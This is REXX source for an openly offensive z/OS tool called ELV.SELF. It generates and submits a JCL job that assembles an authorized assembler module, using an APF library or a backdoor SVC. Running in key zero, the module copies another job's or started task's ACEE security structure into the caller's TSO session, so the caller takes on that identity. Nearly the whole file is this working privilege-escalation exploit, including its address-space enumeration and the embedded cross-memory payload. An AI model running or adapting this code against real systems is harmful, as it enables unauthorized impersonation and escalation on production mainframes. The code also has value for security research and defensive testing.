/* REXX */

/****************************************************************************/
/*  ELV.SELF is a tool to impersonate users/jobs/started tasks on z/OS.      */
/*  It overwrites the caller's ACEE structure with a foreign ACEE            */
/*  owned by another task/user/job.                                          */
/*  The current TSO session is patched giving the caller credentials         */
/*  of the chosen target (attributes, groups, console, etc.)                 */
/*                                                                           */
/*  Requirement: APF library with ALTER access, or SVC granting AUTH         */
/*               Ability to submit Jobs                                      */
/*                                                                           */
/*     Usage from TSO:                                                       */
/*         ex 'ELV.SELF' 'LIST' (Lists all adress spaces)                    */
/*         ex 'ELV.SELF' 'TAR=FTPD1 APF=USER.LINKLIB'                        */
/*         ex 'ELV.SELF' 'TAR=FTPD1 DSN=PDS_DSN SVC=233 12=C1C2C3C4 '        */
/*         ex 'ELV.SELF' 'TAR=FTPD1 DSN=PDS_DSN SVC=233'                     */
/*                                                                           */
/*                                                                           */
/* Inspiration: http://www.cbttape.org/xephon/xephonm/mvs9806.pdf            */
/****************************************************************************/


/**
 ** Parsing input parameters
**/


parse arg parm1 "=" value1 parm2 "=" value2 parm3 "=" value3 parm4 "=" value4

if (parm1 = "LIST" | parm1 ="") then
  DO
    say "*** Listing active address spaces ***"
    say ""
    call list_address_spaces
    exit
  END

if parm2 = "APF" then
  DO
    type = "APF"
    dsn = value2
  END

if parm3 = "SVC" then
  DO
    type = "SVC"
    dsn = value2
    svc_num = value3
    svc_reg = parm4
    svc_reg_v = value4
  END

target = value1


/**
 ** Checking write access to DSN
**/

priv  =  check_priv(dsn)
say ""
if (priv == "NONE") then do
    say "Not enough privileges to alter PDS library "dsn
    exit(-1)
end

if (priv == "READ") then do
    say "Not enough privileges to alter PDS library "dsn
    exit(-1)
end
if priv=="NO RACF PROFILE" then do
    say "Warning: No RACF profile defined for "dsn
    say "Might not be able to write to "dsn
end

/**
 ** Checking write access to DSN
**/

if type = "SVC" then
  Do
    if length(svc_reg_v) <> 0 & length(svc_reg_v) <> 8 then
      Do
        say svc_reg_v "value needs to be 4 bytes long in Hex"
        exit
      End

    if svc_num > 255 then
      Do
        say svc_num " svc needs to be between 200 and 255"
        exit
      End

    if svc_reg > 16 then
      Do
        say svc_reg " register needs to be <= 16"
        exit
      End
  End


/**
 ** Retrieving address space identifiers of remote and local sessions
 ** as well as local ACEE of current session
**/

rmt_asid = get_asid(target)

if rmt_asid = -1 then
  DO
    say "Could not find" target "Check again"
    exit
  END
say "Got ASID" rmt_asid "for" target

local_asid = get_asid(userid())
if local_asid = -1 then
  DO
    say "Could not find asid of" userid() "Check again"
    exit
  END

say "Got ASID" asid "for current session"

local_acee = c2x(get_acee())
say "Local ACEE at " local_acee


/**
 ** Getting paylaod ready !
**/

launch_payload(rmt_asid,local_asid,local_acee,dsn,svc_num,svc_reg,svc_reg_v)

/**
 **  Function: Get address space identifier based on job/task name
**/

get_asid:

    name = arg(1)
    asid = -1

    cvt=ptr(16)
    asvt=ptr(cvt+556)+512
    asvtmaxu=ptr(asvt+4)
    Do a = 0 to asvtmaxu - 1
        ascb=stg(asvt+16+a*4,4)
        If bitand(ascb,'80000000'x) = '00000000'x Then
        Do
            ascb=c2d(ascb)
            ascbjbni=ptr(ascb+172)
            ascbjbni=stg(ascbjbni,8)
            ascbjbns=ptr(ascb+176)
            ascbjbns=stg(ascbjbns,8)
            if (name = strip(ascbjbns) | name = strip(ascbjbni)) then
              DO
                asid = c2d(stg(ascb+36,2))
              END
        End
    End

    return asid

exit

/**
 **  Get address of local ACEE
**/

get_acee:
    ascb = storage(224,4) /* psaaold */
    asxb = storage(d2x(c2d(ascb)+108),4) /* ascbasxb */
    acee = storage(d2x(c2d(asxb)+200),4) /* acee */
    if acee <> 0 then do
        return acee
    else
        say "could not get local ACEE structure"
        exit
    end


/**
 **  List JOBS, Started tasks and TSO sessions
**/

list_address_spaces:

cvt=ptr(16)                            /* Get CVT                    */
asvt=ptr(cvt+556)+512                  /* Get asvt                   */


tso_users.0 = 0
tasks.0 = 0
tasks_users.0 = 0
jobs.0 = 0
jobs_users.0 = 0
system.0 = 0

asvtmaxu=ptr(asvt+4)                   /* Get max asvt entries       */
Do a = 0 to asvtmaxu - 1
  ascb=stg(asvt+16+a*4,4)              /* Get ptr to ascb (Skip master) */

  If bitand(ascb,'80000000'x) = '00000000'x Then /* If in use        */
    Do
      ascb=c2d(ascb)                   /* Get ascb address           */
      cscb=ptr(ascb+56)                /* Get CSCB address           */
      chtrkid=stg(cscb+28,1)           /* Check addr space type      */
      ascbjbni=ptr(ascb+172)           /* Get ascbjbni               */
      ascbjbns=ptr(ascb+176)           /* Get ascbjbns               */
      asxb = ptr(ascb+108)

      acee = ptr(asxb+200)

      ftcb = ptr(asxb+4)
      ltcb = ptr(asxb+8)


      If ascbjbns<>0 & chtrkid = '02'x Then  /* started task */
        Do
          assb = ptr(ascb+336)
          jsab = ptr(assb+168)
          if jsab = 0 then
            usid = ""
          else
            usid = stg(jsab+44,8)

          tmp = tasks.0 + 1
          tasks.tmp = stg(ascbjbns,8)
          tasks_users.tmp = usid
          tasks.0 = tmp


        End
      If ascbjbns<>0 & chtrkid = '01'x Then  /* TSO user */
        Do
          tmp = tso_users.0 + 1
          tso_users.tmp = stg(ascbjbns,8)
          tso_users.0 = tmp

        End
      If ascbjbns<>0 & chtrkid = '04'x Then  /* System */
        Do
          tmp = system.0 + 1
          system.tmp = stg(ascbjbns,8)
          system.0 = tmp

        End
      If ascbjbni<>0 & chtrkid = '03'x Then  /* JOBS */
        Do
          assb = ptr(ascb+336)
          jsab = ptr(assb+168)
          usid = stg(jsab+44,8)

          if jsab = 0 then
            usid = ""
          else
            usid = stg(jsab+44,8)

          tmp = jobs.0 + 1
          jobs.tmp = stg(ascbjbni,8)
          jobs_users.tmp = usid
          jobs.0 = tmp


        End
    End
End

say "**** Started Task - Owner *****"
DO i = 1 to tasks.0
   say tasks.i " - " tasks_users.i
END

say ""
say "**** TSO Users - Owner ****"
DO i = 1 to tso_users.0
   say tso_users.i " - " tso_users.i
END

say ""
say "**** Jobs - Owner ****"
DO i = 1 to jobs.0
   say jobs.i " - " jobs_users.i
END

Return
exit
/*-------------------------------------------------------------------*/
ptr:  Return c2d(storage(d2x(Arg(1)),4))     /* Return a pointer */
/*-------------------------------------------------------------------*/
stg:  Return storage(d2x(Arg(1)),Arg(2))     /* Return storage */

launch_payload:
    rmt_asid = right(arg(1),4,'0')
    local_asid = right(arg(2),4,'0')
    local_acee = arg(3)
    dsn = arg(4)
    svc_num = arg(5)
    svc_reg = arg(6)
    svc_reg_v = arg(7)
    say dsn


    PROG = rand_char(6)
    if svc_num <> "SVC_NUM" then
        say "Compiling " PROG "in" dsn ", using SVC " svc_num
    else
        say "Compiling " PROG "in APF" dsn


    QUEUE "//ELVSELF  JOB (JOBNAME),'XSS',CLASS=A,"
    QUEUE "//*            TYPRUN=SCAN,"
    QUEUE "//             MSGLEVEL=(1,1),MSGCLASS=K,NOTIFY=&SYSUID"
    QUEUE "//*"
    QUEUE "//BUILD   EXEC ASMACL PARM.L='LIST,LET,XREF,MAP,AMODE=31'"
    QUEUE "//C.SYSLIB  DD DSN=SYS1.SISTMAC1,DISP=SHR"
    QUEUE "//          DD DSN=SYS1.MACLIB,DISP=SHR"
    QUEUE "//          DD DSN=SYS1.MODGEN,DISP=SHR"
    QUEUE "//C.SYSIN   DD *,DLM=ZZ"
    QUEUE "        LCLC &MODULE"
    QUEUE "&MODULE SETC 'SELF'"
    QUEUE "&MODULE CSECT"
    QUEUE "&MODULE AMODE 31"
    QUEUE "&MODULE RMODE 24"
    QUEUE "*"
    QUEUE "        SAVE (14,12)"
    QUEUE "        USING SELF,12"
    QUEUE "        LR 12,15"
    QUEUE "        LR 14,13"
    QUEUE "        LA 13,SAVE"
    QUEUE "        ST 13,8(,14)"
    QUEUE "        ST 14,4(,13)"
    QUEUE "*"
    QUEUE "** CROSS MEMORY CALL"
    QUEUE "*"
    QUEUE "@XMEM   XR 2,2                      ZERO REG 2"
    QUEUE "        ESAR 2                      OBTAIN OUR ADDR SPACE ID"
    QUEUE "        ST 2,OURASN SAVE IT         SAVE OUR ADDR SPACE ID"
    QUEUE "*"
    if svc_reg <> "SVC_REG" then
      Do
         QUEUE "        ST "||svc_reg||",STOR         STORE PARAM TO REG "
         QUEUE "        L "||svc_reg||",PARAM         LOAD PARAM TO REG "
      End
    if svc_num <> "SVC_NUM" then
      Do
         QUEUE "        SVC "||svc_num||"         CALL MAGIC SVC        "
         QUEUE "        L "||svc_reg||",STOR         RESTORE PARAM TO REG"
      End
    QUEUE "        MODESET KEY=ZERO,MODE=PROB  AUTH MODE"
    QUEUE "        BAL 14,@INXMEM"
    QUEUE "*"
    QUEUE "        XR 1,1                      REG 1 = 0"
    QUEUE "        L 7,RMTADDR"
    QUEUE "        LA 8,ASCBADDR "
    QUEUE "        LA 2,4                      SIZE OF ASCB PTR"
    QUEUE "        MVCP 0(2,8),0(7),1          MOVE ASCB PTR FROM RMT ADDR"
    QUEUE "*                                   ASCB = @ ADDR 508"
    QUEUE "        L 7,ASCBADDR"
    QUEUE "        LA 8,ASXBADDR"
    QUEUE "        LA 2,4"
    QUEUE "        MVCP 0(2,8),108(7),1        MOVE ASXB PTR FROM RMT ADDR"
    QUEUE "*                                   ASXB = ASCB + 108"
    QUEUE "        L 7,ASXBADDR"
    QUEUE "        LA 8,ACEEADDR"
    QUEUE "        LA 2,4"
    QUEUE "        MVCP 0(2,8),200(7),1        MOVE ACCE PTR FROM RMT ADDR"
    QUEUE "*                                   ACEE = ASXB + 200"
    QUEUE "        L 7,ACEEADDR"
    QUEUE "        LA 8,XMSTOR"
    QUEUE "        LA 2,256"
    QUEUE "        MVCP 0(2,8),0(7),1          MOVE ACEE Struct to XMSTOR"
    QUEUE "*                                   ACEE IS 168 LONG, BUT WTH"
    QUEUE "        BAL 14,@OUTXMEM             LEAVE CROSS MEMORY MODE"
    QUEUE "*        "
    QUEUE "        BAL 14,@TSOMEM              ENTER CROSS MEM LOCAL TSO"
    QUEUE "        L 10,LOCACEE                LOAD LOCAL ACEE"
    QUEUE "        LA 2,52                     GET FIST 52 BYTES ONLY"
    QUEUE "        MVCS 0(2,10),0(8),1         INJECT THEM TO LOCAL TSO"
    QUEUE "        LA 2,44                       "
    QUEUE "        MVCS 56(2,10),56(8),1       SKIP SOME PTRS AND GET 44 B"
    QUEUE "        LA 2,2"
    QUEUE "        MVCS 132(2,10),132(8),1     SKIP SOME PTRS AND GET 2 B"
    QUEUE "        BAL 14,@OUTXMEM"
    QUEUE "*        "
    QUEUE "        MODESET KEY=NZERO,MODE=PROB LEAVE AUTHORIZED MODE"
    QUEUE "*"
    QUEUE "@FINISH L 13,SAVE+4"
    QUEUE "        RETURN (14,12),RC=0"
    QUEUE "*"
    QUEUE "** SUBROUTINE - CROSS MEMORY TARGET **************************"
    QUEUE "*"
    QUEUE "@INXMEM LA 2,1                      REG 2 = 1"
    QUEUE "        AXSET AX=(2)                AUTH INDEX = 1"
    QUEUE "        LH 2,RMTASID                INTO XMEM MODE"
    QUEUE "        SSAR 2"
    QUEUE "@INXEND BR 14"
    QUEUE "*"
    QUEUE "** SUBROUTINE - CROSS MEMORY LOCAL TSO **************************"
    QUEUE "*"
    QUEUE "@TSOMEM LA 2,1                      REG 2 = 1"
    QUEUE "        AXSET AX=(2)                AUTH INDEX = 1"
    QUEUE "        LH 2,TSOASID                ASID TO SNOOP ON"
    QUEUE "        SSAR 2                      INTO CROSS MEMORY"
    QUEUE "        BR 14"
    QUEUE "*"
    QUEUE "** SUBROUTINE - OUT OF CROSS MEMORY MODE ************************"
    QUEUE "*"
    QUEUE "@OUTXMEM L 2,OURASN                 LOAD ORIGINAL ASN"
    QUEUE "        SSAR 2                      OUT OF CROSS MEMORY"
    QUEUE "        XR 2,2                      REG 2 = 0"
    QUEUE "        AXSET AX=(2)                AUTH INDEX = 0"
    QUEUE "@OUTXEND BR 14"
    QUEUE "*"
    QUEUE "** STORAGE ******************************************************"
    QUEUE "*"
    QUEUE "        DS 0D"
    QUEUE "SAVE    DS 18F"
    QUEUE "OURASN  DS F"
    QUEUE "RMTADDR DC X'00000224'"
    QUEUE "ASCBADDR DC X'00000000'"
    QUEUE "ASXBADDR DC X'00000000'"
    QUEUE "ACEEADDR DC X'00000000'"
    QUEUE "LOCACEE  DC X'"||local_acee||"'"
    QUEUE "RMTASID  DC H'"||rmt_asid||"'"
    QUEUE "TSOASID  DC H'"||local_asid||"'"
    QUEUE "XMSTOR  DS CL256"
    if svc_reg_v <> "SVC_REG_V" then
      Do
         QUEUE "PARAM  DC X'"||svc_reg_v||"'"
         QUEUE "STOR  DS F"
      End
    QUEUE "*"
    QUEUE "*       END of Program"
    QUEUE "*"
    QUEUE "        PRINT NOGEN"
    QUEUE "        IKJTSVT"
    QUEUE "        END"
    QUEUE "ZZ"
    QUEUE "//L.SYSLMOD DD DISP=SHR,DSN="||dsn||""
    QUEUE "//L.SYSIN   DD *"
    QUEUE "  SETCODE AC(1)"
    QUEUE "  NAME "||PROG||"(R)"
    QUEUE "/*"
    QUEUE "//*"
    QUEUE "//STEP01 EXEC PGM="||PROG||",COND=(0,NE)"
    QUEUE "//STEPLIB   DD DSN="||dsn||",DISP=SHR"
    QUEUE "$$"

    o = OUTTRAP("output.",,"CONCAT")
    address tso "SUBMIT * END($$)"
    o = OUTTRAP(OFF)

    exit(0)

rand_char:
    length = arg(1)
    out = ""
    do counter=0 to length
       i = RANDOM(1,3)
       if i ==1 then out = out||D2C(RANDOM(193,201))
       if i ==2 then out = out||D2C(RANDOM(226,233))
       if i ==3 then out = out||D2C(RANDOM(209,217))
    end
    return out


check_priv:

    NOT_AUTH="NOT AUTHORIZED"
    NO_PROFILE="NO RACF"

    DSN = arg(1)
    X = OUTTRAP('OUT.')
    ADDRESS TSO "LD DA('"DSN"')"
    Y = OUTTRAP('OFF')
    IF OUT.0 == 1 & INDEX(OUT.1,NOT_AUTH)>0 THEN DO
       return "NONE"
    END
    IF OUT.0 == 1 & INDEX(OUT.1,NO_PROFILE)>0 THEN DO
       return "NO RACF PROFILE"
    END
    IF OUT.0>1 THEN DO
       ACCESS = WORD(OUT.17,1)
       return ACCESS
    END
    return -1
